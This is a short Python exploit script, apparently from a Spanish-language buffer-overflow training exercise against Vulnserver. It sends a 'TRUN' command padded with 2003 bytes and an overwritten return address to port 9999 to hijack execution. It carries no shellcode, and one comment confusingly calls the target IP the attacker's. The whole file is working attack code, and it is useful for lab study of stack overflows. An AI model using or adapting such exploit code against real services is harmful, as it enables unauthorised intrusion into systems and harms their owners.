#!/usr/bin/python3
import sys
import socket

ip = "192.168.0.39" # CAMBIA ESTO y pon la ip de tu pc atacante aqui
port = 9999

buffer = b"A" * 2003 + b"\xaf\x11\x50\x62"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    print("[*] Conectado al servidor")
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner.decode()}")
    payload = b'TRUN /.:/' + buffer
    sock.send(payload)
    print("[*] Payload enviado")
    sock.close()
except ConnectionRefusedError:
    print("[-] Conexión rechazada - verifica que Vulnserver esté corriendo")
except socket.timeout:
    print("[-] Timeout")
except Exception as e:
    print(f"[-] Error: {e}")

